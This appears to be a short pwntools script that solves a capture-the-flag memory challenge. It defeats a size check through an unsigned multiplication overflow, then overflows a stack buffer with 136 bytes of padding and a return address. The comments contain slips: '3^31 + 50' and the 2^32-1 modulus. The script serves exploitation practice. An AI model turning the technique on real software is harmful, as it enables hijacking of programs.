import pwn

p = pwn.process("/challenge/babymem-level-5-0")

# record_size * record_num <= 98
# we just need to overflow the mul
#
# considering the following: record_num = 2; record_size = s; 
# we have 2s <= 98
# considering s as an unsigned int we must have 2s <= 98 + k*(2^32-1)
# thus s <= 49 + 2^31
# by sending s = 2^31 + 49 the check is valid
# by sending s = 3^31 + 50 it is not

p.readuntil(b"to send: ")
p.writeline("2")

p.readuntil(b"payload record: ")
p.writeline("2147483697")

p.readuntil(b"bytes)!")
val = pwn.p64(0x00000000004022d7)
p.write(b"A"*136+val)

print(p.readall().decode("utf-8"))
